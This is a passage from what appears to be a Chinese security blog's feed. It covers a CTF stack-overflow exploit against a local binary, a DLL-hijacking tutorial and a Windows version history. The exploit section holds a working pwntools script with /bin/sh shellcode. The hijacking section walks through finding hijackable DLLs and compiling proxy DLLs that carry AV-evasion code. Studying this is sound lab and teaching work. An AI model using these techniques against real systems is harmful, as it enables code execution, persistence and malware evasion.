&quot;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;...</span></span><br><span class="line"><span class="string">0xffffd225:     &quot;\n\264\374&quot;, &lt;incomplete sequence \367&gt;</span></span><br><span class="line"><span class="string">0xffffd226:     &quot;&quot;</span></span><br><span class="line"><span class="string">0xffffd227:     &quot;\373\367\001&quot;</span></span><br><span class="line"><span class="string">0xffffd228:     &quot;&quot;</span></span><br><span class="line"><span class="string">0xffffd229:     &quot;&quot;</span></span><br><span class="line"><span class="string">0xffffd22a:     &quot;&quot;</span></span><br><span class="line"><span class="string">0xffffd22b:     &quot;&quot;</span></span><br><span class="line"><span class="string">0xffffd22c:     &quot;&quot;</span></span><br><span class="line"><span class="string">0xffffd231:     &quot;&quot;</span></span><br></pre></td></tr></table></figure><p>因为溢出点是140个字节，再加上4个字节的ret地址，通过gdb的命令<code>x/10s $esp-144</code>，我们可以得到buf的地址为<strong>0xffffd190</strong>，然后利用脚本即可达到溢出执行命令的效果</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/10.png" alt="image-20201119104715107"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#test.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./level1&quot;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;x86&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">ret = <span class="number">0xffffd190</span></span><br><span class="line">shellcode = <span class="string">b&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31&quot;</span> </span><br><span class="line">shellcode+= <span class="string">b&quot;\xd2\xb0\x0b\xcd\x80&quot;</span></span><br><span class="line"><span class="comment">#shellcode=asm(shellcraft.sh())</span></span><br><span class="line">payload = shellcode + <span class="string">b&#x27;A&#x27;</span>*(<span class="number">140</span>-<span class="built_in">len</span>(shellcode)) + p32(ret)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>坑点</p></blockquote><p>用kali调试好像是有问题的，溢出的ret地址经常不对，最好用Ubuntu，立马删Kali！！</p><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;introspelliam.github.io&#x2F;2017&#x2F;09&#x2F;30&#x2F;linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E7%94%A8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;183370</span><br><span class="line">http:&#x2F;&#x2F;www.peckerwood.top&#x2F;post&#x2F;rop_0x01&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;blog.nsfocus.net&#x2F;easy-implement-shellcode-xiangjie&#x2F;</span><br><span class="line">《CTF竞赛权威指南》</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>恶意程序研究之DLL劫持</title>
    <link href="https://www.ascotbe.com/2020/11/13/DynamicLinkLibraryHijack/"/>
    <id>https://www.ascotbe.com/2020/11/13/DynamicLinkLibraryHijack/</id>
    <published>2020-11-13T07:45:42.000Z</published>
    <updated>2021-05-17T00:31:53.389Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>声明</p></blockquote><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p><h2 id="DLL劫持"><a href="#DLL劫持" class="headerlink" title="DLL劫持"></a>DLL劫持</h2><p>DLL劫持一直深受黑客们的喜欢，利用此技术可以实现启动木马后门，游戏外挂插件的注入，绕过UAC等操作。</p><p>全文约定：全文中系统盘所在的位置默认为C盘</p><h2 id="DLL加载顺序"><a href="#DLL加载顺序" class="headerlink" title="DLL加载顺序"></a>DLL加载顺序</h2><p>DLL是以文件的形式存在在硬盘中，那么应用程序又是如何索引所需的DLL呢？其实，Microsoft已在<a href="https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order">此处</a>完整记录了DLL搜索顺序。</p><blockquote><p>微软的DLL劫持分为三个阶段</p></blockquote><ul><li>无保护阶段：Windows XP SP2之前</li><li>保护阶段：Windows XP SP2之后，Windows 7之前</li><li>进一步保护阶段：Windows 7之后</li></ul><blockquote><h4 id="Windows-XP-SP2之前"><a href="#Windows-XP-SP2之前" class="headerlink" title="Windows XP SP2之前"></a>Windows XP SP2之前</h4></blockquote><ol><li>进程对应的应用程序所在目录；</li><li>加载 DLL 时所在的当前目录；</li><li>系统目录即 SYSTEM32 目录（通过 GetSystemDirectory 获取）；</li><li>16位系统目录即 SYSTEM 目录；</li><li>Windows目录（通过 GetWindowsDirectory 获取）；</li><li>PATH环境变量中的各个目录；</li></ol><blockquote><h4 id="Windows-XP-SP2之后"><a href="#Windows-XP-SP2之后" class="headerlink" title="Windows XP SP2之后"></a>Windows XP SP2之后</h4></blockquote><p>微软为了防止DLL劫持漏洞的产生，在XP SP2之后，添加了一个SafeDllSearchMode的注册表属性。注册表路径如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\SafeDllSearchMode</span><br></pre></td></tr></table></figure><p>当SafeDllSearchMode的值设置为1，即安全DLL搜索模式开启时，查找DLL的目录顺序如下：</p><ol><li>应用程序所在目录；</li><li>系统目录SYSTEM32 目录；</li><li>16位系统目录即SYSTEM 目录。该项只是为了向前兼容的处理，可以不考虑；</li><li>Windows目录。通常是<strong>C:\Windows</strong>；</li><li>加载 DLL 时所在的当前目录；</li><li>环境变量<strong>PATH</strong>中所有目录。需要注意的是，这里不包括<strong>App Paths</strong>注册表项指定的应用程序路径。</li></ol><p><strong>PS：</strong>“安全DLL查找模式”默认是启用的</p><blockquote><h4 id="Windows-7之后"><a href="#Windows-7之后" class="headerlink" title="Windows 7之后"></a>Windows 7之后</h4></blockquote><p>微软为了更进一步的防御系统的DLL被劫持，将一些容易被劫持的系统DLL写进了一个注册表项中，<strong>那么凡是此项下的DLL文件就会被禁止从EXE自身所在的目录下调用</strong>，而只能从系统目录即SYSTEM32目录下调用。注册表路径如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs</span><br></pre></td></tr></table></figure><p>Windows 10中的如下</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/DynamicLinkLibraryHijack/1.png" alt="image-20200921151524382"></p><h2 id="如何寻找DLL劫持"><a href="#如何寻找DLL劫持" class="headerlink" title="如何寻找DLL劫持"></a>如何寻找DLL劫持</h2><blockquote><p>劫持系统DLL</p></blockquote><p>要分析一个应用程序是否存在劫持系统DLL的漏洞，需要这么几个步骤</p><ul><li>启动应用程序</li><li>使用Process Explorer等类似软件查看该应用程序启动后加载的动态链接库。</li><li>从该应用程序已经加载的DLL列表中，查找在上述“KnownDLLs注册表项”中不存在的DLL。</li><li>编写从上一步获取到的DLL的劫持DLL。</li><li>将编写好的劫持DLL放到该应用程序目录下，重新启动该应用程序，检测是否劫持成功。</li></ul><p>如果对以上步骤都没问题还是没有实现劫持的话，具体可能有一下情况</p><ul><li>DLL不在KnownDLLs注册表中但是已经被微软做了保护，比如ntdll.dll等系统核心dll</li><li>宿主进程在调用LoadLibrary函数时使用了“绝对路径”</li><li>宿主进程对调用的DLL进行了校检，比如文件MD5、HASH等值</li><li>宿主调用DLL时使用了SetDllDirectory函数把当前目录从DLL的搜索顺序列表中删除</li></ul><blockquote><p>劫持应用DLL</p></blockquote><p>劫持这个DLL就方便多了，只要宿主没有对自己的DLL做校检的话就可以进行劫持替换</p><h2 id="手动寻找"><a href="#手动寻找" class="headerlink" title="手动寻找"></a>手动寻找</h2><p>由于Windows 10做了很多限制，我们使用Windows 7来测试会方便很多，如果是新的Windows 7系统需要打个补丁，不然用不了Process Monitor</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.microsoft.com&#x2F;en-us&#x2F;download&#x2F;confirmation.aspx?id&#x3D;46148</span><br></pre></td></tr></table></figure><p>利用<code>NDP461-KB3102438-Web.exe</code>程序进行进行测试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#微软下载地址</span><br><span class="line">http:&#x2F;&#x2F;www.microsoft.com&#x2F;zh-cn&#x2F;download&#x2F;details.aspx?id&#x3D;49981&amp;134b2bb0-86c1-fe9f-d523-281faef41695&#x3D;1&amp;fa43d42b-25b5-4a42-fe9b-1634f450f5ee&#x3D;True</span><br><span class="line">#备用下载地址</span><br><span class="line">XXX</span><br></pre></td></tr></table></figure><p>然后使用Process Monitor做如下设置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Include the following filters:</span><br><span class="line">Operation is CreateFile</span><br><span class="line">Operation is LoadImage</span><br><span class="line">Path contains .cpl</span><br><span class="line">Path contains .dll</span><br><span class="line">Path contains .drv</span><br><span class="line">Path contains .exe</span><br><span class="line">Path contains .ocx</span><br><span class="line">Path contains .scr</span><br><span class="line">Path contains .sys</span><br><span class="line"></span><br><span class="line">Exclude the following filters:</span><br><span class="line">Process Name is procmon.exe</span><br><span class="line">Process Name is Procmon64.exe</span><br><span class="line">Process Name is System</span><br><span class="line">Process Name is not NDP461-KB3102438-Web.exe &#x2F;&#x2F;这个是你要测试的进程</span><br><span class="line">Operation begins with IRP_MJ_</span><br><span class="line">Operation begins with FASTIO_</span><br><span class="line">Result is SUCCESS</span><br><span class="line">Path ends with pagefile.sys</span><br></pre></td></tr></table></figure><p><strong>设置Exclude Result is SUCCESS后会只显示NAME NOT FOUND项，也就是只查看未成功加载的dll项，即KnownDLLs的列表中不包含的dll名称，可用于查找存在漏洞的dll路径</strong></p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/DynamicLinkLibraryHijack/2.png" alt="image-20201113145850843"></p><p>可以看到<code>NDP461-KB3102438-Web.exe</code>在启动的过程中会加载下图中框起来的DLL，并且DLL的路径和这个进程在相同文件夹，同时显示<code>NAME NOT FOUND</code>，表示无法找到该文件，加载失败，这就说明这几个DLL是可以进行劫持的</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/DynamicLinkLibraryHijack/3.png" alt="image-20201113150057290"></p><h2 id="劫持测试"><a href="#劫持测试" class="headerlink" title="劫持测试"></a>劫持测试</h2><p>既然发现了劫持的DLL，我们就可以进程初步演示了，搞一个执行计算器的DLL然后把它改名为CRYPTSP.dll，接着运行程序即可达到劫持的作用</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/DynamicLinkLibraryHijack/4.png" alt="image-20201113151256951"></p><h2 id="实战化利用"><a href="#实战化利用" class="headerlink" title="实战化利用"></a>实战化利用</h2><p>如果动手过的小伙伴可以发现，如果我们吧CRYPTSP.dll的名称改成VERSION.dll的时候用来劫持的话，会发现报错。</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/DynamicLinkLibraryHijack/5.png" alt="image-20201113151835798"></p><p>主要的原因是测试DLL只有一个加载的时候执行计算器的函数，而并没有劫持目标上面的所有导出函数，所以当我们找到了一个可以劫持的DLL的时候，需要用脚本一键生成劫持cpp文件后进行编译，以下是对系统中的twain_32的一键生成方式的演示</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/DynamicLinkLibraryHijack/6.png" alt="image-20201113152556376"></p><p>导出后我们就可以把免杀代码放到这个位置然后编译即可</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/DynamicLinkLibraryHijack/7.png" alt="image-20201113152811232"></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;sensepost&#x2F;rattler</span><br><span class="line">https:&#x2F;&#x2F;3gstudent.github.io&#x2F;DLL%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E%E8%87%AA%E5%8A%A8%E5%8C%96%E8%AF%86%E5%88%AB%E5%B7%A5%E5%85%B7Rattler%E6%B5%8B%E8%AF%95&#x2F;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Windows杂谈</title>
    <link href="https://www.ascotbe.com/2020/11/02/WindowsTalk/"/>
    <id>https://www.ascotbe.com/2020/11/02/WindowsTalk/</id>
    <published>2020-11-02T10:45:42.000Z</published>
    <updated>2021-05-17T00:32:35.016Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>前言</p></blockquote><p>梳理Windows的历史</p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/HardwareRelated/1.png" alt="1" style="zoom:50%;" /><h3 id="Windows杂谈"><a href="#Windows杂谈" class="headerlink" title="Windows杂谈"></a>Windows杂谈</h3><p>微软于1985年11月20日推出了名为Windows的操作系统，作为MS-DOS的图形操作系统外壳，而MacOS是1984年推出的。并且Windows 10是微软最后一个版本的操作系统，不在会有像Windows 7 和Windows 7 sp1 或者sp2这种升级，而是统一使用Windows 10 1507这样的编号。</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/HardwareRelated/2.png" alt="image-20201102145353213"> </p><h3 id="Windows内核区别"><a href="#Windows内核区别" class="headerlink" title="Windows内核区别"></a>Windows内核区别</h3><blockquote><h4 id="MS-DOS"><a href="#MS-DOS" class="headerlink" title="MS-DOS"></a>MS-DOS</h4></blockquote><p>1980年，西雅图计算机产品公司的一名24岁的程序员Tim Paterson(蒂姆·帕特森)花费了四个月时间编写出了 86-DOS 操作系统。1981年7月，微软以五万美元的代价向西雅图公司购得本产品的全部著作权，并将它更名为 MS-DOS。</p><p>MS-DOS源码下载</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;computerhistory.org&#x2F;blogs&#x2F;microsoft-research-license-agreement-msdos-v1-1-v2-0&#x2F;</span><br></pre></td></tr></table></figure><blockquote><h4 id="Windows-95"><a href="#Windows-95" class="headerlink" title="Windows 95"></a>Windows 95</h4></blockquote><p>Windows 95是微软公司于1995年推出的电脑操作系统。Windows 95是一个混合的16位/32位Windows系统，其版本号为4.0，开发代号为Chicago。Windows 95是微软之前独立的操作系统MS-DOS和Microsoft Windows的直接后续版本。</p><p>Windows 95共有五种版本：</p><ul><li>Windows 95 零售版（发布日期1995年8月24日）</li><li>Windows 95 OEM Service Release 1（OSR1）（发布日期1996年2月14日，包括 Windows 95 Service Pack 1）</li><li>Windows 95 OEM Service Release 2（OSR2）（发布日期1996年8月24日，包括一些改良例如IE 3.0和FAT32的支持）</li><li>Windows 95 OEM Service Release 2.1（OSR2.1）（发布日期1997年8月24日，包括基本USB支持）</li><li>Windows 95 OEM Service Release 2.5（OSR2.5）（发布日期1997年11月26日，包括以上版本多所有功能，另附IE 4.0与DirectX 5.0）</li></ul><blockquote><h4 id="Windows-Embedded-Compact"><a href="#Windows-Embedded-Compact" class="headerlink" title="Windows Embedded Compact"></a>Windows Embedded Compact</h4></blockquote><p>Windows CE 1.0最早于1996年推出，是单色的<strong>Windows 95</strong>内核简化版本。</p><p>Windows CE 3.0是微软的Windows Compact Edition，已摆脱旧有的Windows 95简化格式，是一套全新的操作系统，支持5种CPU：x86、PowerPC、ARM、MIPS、SH3/4。</p><p>目前已经更新到Windows CE 7.0</p><p>Windows CE可以使用在各式各样的系统上，最有名的是Pocket PC以及微软的SmartPhone。其他较不为人知的设备包括微软的车载电脑、机顶盒、生产在线的控制设备、公共场所的信息站、电子辞典及导航仪等等，有些设备甚至没有任何人机界面。</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/HardwareRelated/3.png" alt="Timeline of Windows CE Development"></p><p align="center" >截止2007年数据（2011年已使用CE 7.0内核）</p><blockquote><h4 id="Windows-New-Technology"><a href="#Windows-New-Technology" class="headerlink" title="Windows New Technology"></a>Windows New Technology</h4></blockquote><p><strong>Windows NT</strong>，<strong>新技术视窗操作系统</strong>（Windows New Technology）的简称，是微软公司1993年推出的纯32位操作系统核心。截止2020年最新内核版本为NT 10</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/HardwareRelated/4.png" alt="img"></p><h3 id="Windows版本历史"><a href="#Windows版本历史" class="headerlink" title="Windows版本历史"></a>Windows版本历史</h3><blockquote><h4 id="以-DOS-为基础的-Windows"><a href="#以-DOS-为基础的-Windows" class="headerlink" title="以 DOS 为基础的 Windows"></a>以 DOS 为基础的 Windows</h4></blockquote><p>早期版本的Windows通常被看作仅仅是运行于MS-DOS系统中的一个图形用户界面，不是操作系统。16位版本的Windows包括<strong>Windows 1.0</strong>、<strong>Windows 2.0</strong>及最後版本<strong>Windows 3.X</strong>。</p><blockquote><h4 id="以-Windows-9x-为基础的-Windows"><a href="#以-Windows-9x-为基础的-Windows" class="headerlink" title="以 Windows 9x 为基础的 Windows"></a>以 Windows 9x 为基础的 Windows</h4></blockquote><p><strong>Windows 9x</strong>是<strong>Windows 95</strong>、<strong>Windows 98</strong>、<strong>Windows ME</strong>等以 <strong>Windows 95</strong>内核作为参考的微软操作系统通称，与 <strong>Windows NT</strong>分离于两个开发路线。它是一种多任务图形方式的操作系统。</p><p>Windows 9x 仍然需要依赖16位的DOS基层程式才能运行，不算是真正意义上的32位操作系统，由于使用DOS代码，架构也与16位DOS一样，核心属于单核心，但也引入了部分32位作業系統的特性，具有一定的32位的处理能力。</p><blockquote><h4 id="以-Windows-NT-内核为基础的-Windows"><a href="#以-Windows-NT-内核为基础的-Windows" class="headerlink" title="以 Windows NT 内核为基础的 Windows"></a>以 Windows NT 内核为基础的 Windows</h4></blockquote><h5 id="32位元操作系统"><a href="#32位元操作系统" class="headerlink" title="32位元操作系统"></a>32位元操作系统</h5><p>這個系列是<strong>Windows NT体系结构</strong>操作系统，是真正的纯32位操作系统。Windows NT架构操作系统是完整獨立的操作系统，不同於依然需要DOS基層程式的混合16/32位的Windows 9x。</p><h5 id="64位操作系统"><a href="#64位操作系统" class="headerlink" title="64位操作系统"></a>64位操作系统</h5><p>64位Windows NT架构操作系统，分为支持于<strong>IA-64</strong>架构和<strong>x64</strong>架构的两种不同版本。</p><p>在历史上微软曾对两种不同的64位架构提供支持，其一是Intel公司和HP联合开发具有革新化的Itanium家族架构，或称之为IA-64；和AMD公司开发的演进化的x86-64架构。微软在发布Windows Server 2012 R2前放弃了对Itanium架构的支持。因此现在微软的64位产品指的单单是x86-64架构，而在微软的词汇中称为x64。</p><p>支持Itanium家族架构的微软Windows产品有：</p><ul><li>Windows 2000 Advanced/Datacenter Server Limited Edition</li><li>Windows XP 64-bit Edition</li><li>Windows XP 64-bit Edition Version 2003</li><li>Windows Server 2003/2003 R2 Enterprise/Datacenter</li><li>Windows Server 2008/2008 R2 for Itanium Based System</li></ul><p>支持x64架构的Windows产品有：</p><ul><li>Windows XP Professional x64 Edition</li><li>Windows Server 2003/2003R2全线产品（Web版除外）</li><li>Windows Vista/7/8/8.1</li><li>Windows Server 2008/2008R2/2012/2012R2 全线产品</li><li>Windows 10</li></ul><blockquote><h4 id="以-Windows-CE-内核为基础的-Windows"><a href="#以-Windows-CE-内核为基础的-Windows" class="headerlink" title="以 Windows CE 内核为基础的 Windows"></a>以 Windows CE 内核为基础的 Windows</h4></blockquote><p>这个操作系统主要是用在嵌入式系统中或是硬体规格较低的电脑系统（例如很少的记忆体，较慢的中央处理器等）</p><ul><li>Pocket PC 2000</li><li>Pocket PC 2002</li><li>Windows Mobile 2003</li><li>Windows Mobile 2003 SE</li><li>Windows Mobile 5</li><li>Windows Mobile 6</li><li>Windows Mobile 6.1</li><li>Windows Mobile 6.5</li><li>Windows Mobile 6.5.3</li><li>Windows Phone 7</li></ul><h4 align="center" >Windows版本历史</h4><table><thead><tr><th align="center">发布时间</th><th align="center">版本代号</th><th align="center">正式名称</th><th align="center">最终组建</th></tr></thead><tbody><tr><td align="center">1985年11月20日</td><td align="center">1.01</td><td align="center">Windows 1.01 （已停止支持于2001/12/31）</td><td align="center">-</td></tr><tr><td align="center">1986年1月14日</td><td align="center">1.02</td><td align="center">Windows 1.02 （已停止支持于2001/12/30）</td><td align="center">-</td></tr><tr><td align="center">1986年8月14日</td><td align="center">1.03</td><td align="center">Windows 1.03 （已停止支持于2001/12/31）</td><td align="center">-</td></tr><tr><td align="center">1987年</td><td align="center">1.04</td><td align="center">Windows 1.04 （已停止支持于2001/12/31）</td><td align="center">-</td></tr><tr><td align="center">1987年12月9日</td><td align="center">2.03</td><td align="center">Windows 2.03 （已停止支持于2001/12/31）</td><td align="center">-</td></tr><tr><td align="center">1988年5月27日</td><td align="center">2.1</td><td align="center">Windows 2.1 （已停止支持于2001/12/31）</td><td align="center">-</td></tr><tr><td align="center">1988年5月27日</td><td align="center">2.1</td><td align="center">Windows/286 2.1 ( 已停止支持于2001/12/31)</td><td align="center">-</td></tr><tr><td align="center">1988年8月12日</td><td align="center">2.03</td><td align="center">Windows/386 2.03 ( 已停止支持于2001/12/31)</td><td align="center">-</td></tr><tr><td align="center">1990年5月22日</td><td align="center">3.0</td><td align="center">Windows 3.0 ( 已停止支持于2001/12/31)</td><td align="center">-</td></tr><tr><td align="center">1992年4月6日</td><td align="center">3.1</td><td align="center">Windows 3.1 ( 已停止支持于2001/12/31)</td><td align="center">103</td></tr><tr><td align="center">1993年7月27日</td><td align="center">NT 3.1</td><td align="center">Windows NT 3.1 ( 已停止支持于2000-12-31 )</td><td align="center">511(RTM-SP2),528(SP3)</td></tr><tr><td align="center">1993年8月11日</td><td align="center">WFW 3.11</td><td align="center">Windows For Workgroups 3.11 ( 已停止支持于2001/12/31)</td><td align="center">300</td></tr><tr><td align="center">1993年11月22日</td><td align="center">3.2</td><td align="center">Windows 3.2（简体中文版）( 已停止支持于2001/12/31 )</td><td align="center">153</td></tr><tr><td align="center">1994年9月21日</td><td align="center">NT 3.5</td><td align="center">Windows NT 3.5 ( 已停止支持于2001/12/31 )</td><td align="center">807</td></tr><tr><td align="center">1995年5月30日</td><td align="center">NT 3.51</td><td align="center">Windows NT 3.51 ( 已停止支持 于2001/12/31)</td><td align="center">1057</td></tr><tr><td align="center">1995年8月24日</td><td align="center">4.0</td><td align="center">Windows 95 ( 已停止支持于2001/12/31 )</td><td align="center">950(RTM,OSR1),1111(OSR2),1214(OSR2.1),1216(OSR2.5)</td></tr><tr><td align="center">1996年7月29日</td><td align="center">NT 4.0</td><td align="center">Windows NT 4.0 ( 已停止支持于2004/12/31)</td><td align="center">1381</td></tr><tr><td align="center">1996年11月16日</td><td align="center">CE 1.01</td><td align="center">Windows CE 1.01 ( 已停止支持 )</td><td align="center">-</td></tr><tr><td align="center">1997年11月1日</td><td align="center">CE 2.0</td><td align="center">Windows CE 2.0 ( 已停止支持 )</td><td align="center">-</td></tr><tr><td align="center">1998年1月8日</td><td align="center">CE 2.01</td><td align="center">Windows CE 2.01 ( 已停止支持 )</td><td align="center">-</td></tr><tr><td align="center">1998年3月1日</td><td align="center">CE 2.10</td><td align="center">Windows CE 2.10 ( 已停止支持 )</td><td align="center">-</td></tr><tr><td align="center">1998年5月15日</td><td align="center">4.1</td><td align="center">Windows 98 ( 已停止支持于2006/6/30)</td><td align="center">1998(RTM),2000(SP1)</td></tr><tr><td align="center">1998年7月1日</td><td align="center">CE 2.11</td><td align="center">Windows CE 2.11 ( 已停止支持 )</td><td align="center">-</td></tr><tr><td align="center">1999年4月23日</td><td align="center">4.1</td><td align="center">Windows 98 Second Edition（98 SE）( 已停止支持于2006/6/30 )</td><td align="center">2222</td></tr><tr><td align="center">1999年9月28日</td><td align="center">CE 2.12</td><td align="center">Windows CE 2.12 ( 已停止支持 )</td><td align="center">-</td></tr><tr><td align="center">2000年</td><td align="center">NT 5.0</td><td align="center">Windows 2000 ( 已停止支持于2010/7/13 )</td><td align="center">2195</td></tr><tr><td align="center">2000年</td><td align="center">4.9</td><td align="center">Windows Millennium Edition （ME）( 已停止支持于2006/6/30)</td><td align="center">3000</td></tr><tr><td align="center">2000年</td><td align="center">CE 3.0</td><td align="center">Windows CE 3.0 ( 已停止支持 )</td><td align="center">-</td></tr><tr><td align="center">2001年</td><td align="center">NT 5.1</td><td align="center">Windows XP ( 已停止支持于2014/4/8 )</td><td align="center">2600</td></tr><tr><td align="center">2002年</td><td align="center">CE 4.1</td><td align="center">Windows CE 4.1 （已停止支持）</td><td align="center">-</td></tr><tr><td align="center">2002年</td><td align="center">NT 5.1</td><td align="center">Windows XP Media Center Edition ( 已停止支持 )</td><td align="center">2600</td></tr><tr><td align="center">2002年</td><td align="center">NT 5.1</td><td align="center">Windows XP TabletPC Edition ( 已停止支持 )</td><td align="center">2600</td></tr><tr><td align="center">2003年</td><td align="center">NT 5.2</td><td align="center">Windows Server 2003 ( 已停止支持于2015/7/14 )</td><td align="center">3790</td></tr><tr><td align="center">2003年</td><td align="center">NT 5.2</td><td align="center">Windows XP 64-bit Edition ( 已停止支持 )</td><td align="center">2600(v2002),3790(v2003)</td></tr><tr><td align="center">2004年</td><td align="center">CE 5.0</td><td align="center">Windows CE 5.0 ( 已停止支持 )</td><td align="center">1400</td></tr><tr><td align="center">2005年</td><td align="center">NT 5.2</td><td align="center">Windows XP Professional x64 Edition ( 已停止支持 )</td><td align="center">3790</td></tr><tr><td align="center">2005年</td><td align="center">NT 5.2</td><td align="center">Windows Server 2003 x64 Editions ( 已停止支持 )</td><td align="center">3790</td></tr><tr><td align="center">2006年</td><td align="center">NT 5.1</td><td align="center">Windows Fundamentals for Legacy PCs ( 已停止支持 )</td><td align="center">2600</td></tr><tr><td align="center">2006年</td><td align="center">CE 6.0</td><td align="center">Windows Embedded CE 6.0 ( 已停止支持 )</td><td align="center">1937</td></tr><tr><td align="center">2007年</td><td align="center">NT 6.0</td><td align="center">Windows Vista ( 已停止支持于2017/4/11 )</td><td align="center">6000(RTM),6001(SP1),6002(SP2),6003(SP2 Update)</td></tr><tr><td align="center">2007年</td><td align="center">NT 6.0</td><td align="center">Windows Home Server ( 已停止支持 )</td><td align="center">1500(RTM),1800(PP1),2030(PP2),3436(PP3)</td></tr><tr><td align="center">2008年</td><td align="center">NT 6.0</td><td align="center">Windows Server 2008 ( 已停止支持于2020/1/14 )</td><td align="center">6001(RTM),6002(SP2),6003(SP2 Update)</td></tr><tr><td align="center">2009年</td><td align="center">NT 6.1</td><td align="center">Windows 7 ( 已停止支持于2020/1/14 )</td><td align="center">7600(RTM),7601(SP1)</td></tr><tr><td align="center">2009年</td><td align="center">NT 6.1</td><td align="center">Windows Server 2008 R2 ( 已停止支持于2020/1/14 )</td><td align="center">7600(RTM),7601(SP1)</td></tr><tr><td align="center">2010年</td><td align="center">CE 7.0</td><td align="center">Windows Phone 7 ( 已停止支持 )</td><td align="center">-</td></tr><tr><td align="center">2011年</td><td align="center">CE 7.0</td><td align="center">Windows Embedded Compact 7 ( 已停止支持 )</td><td align="center">-</td></tr><tr><td align="center">2011年</td><td align="center">NT 6.1</td><td align="center">Windows Home Server 2011 ( 已停止支持 )</td><td align="center">8800</td></tr><tr><td align="center">2012年</td><td align="center">NT 6.2</td><td align="center">Windows 8 ( 已停止支持于2016/1/12 )</td><td align="center">9200</td></tr><tr><td align="center">2012年</td><td align="center">NT 6.2</td><td align="center">Windows RT ( 已停止支持 )</td><td align="center">9200</td></tr><tr><td align="center">2012年</td><td align="center">NT 6.2</td><td align="center">Windows Server 2012 （至2023/1/9停止支持）</td><td align="center">9200</td></tr><tr><td align="center">2012年</td><td align="center">NT 6.2</td><td align="center">Windows Phone 8 （已停止支持）</td><td align="center">10322</td></tr><tr><td align="center">2013年</td><td align="center">NT 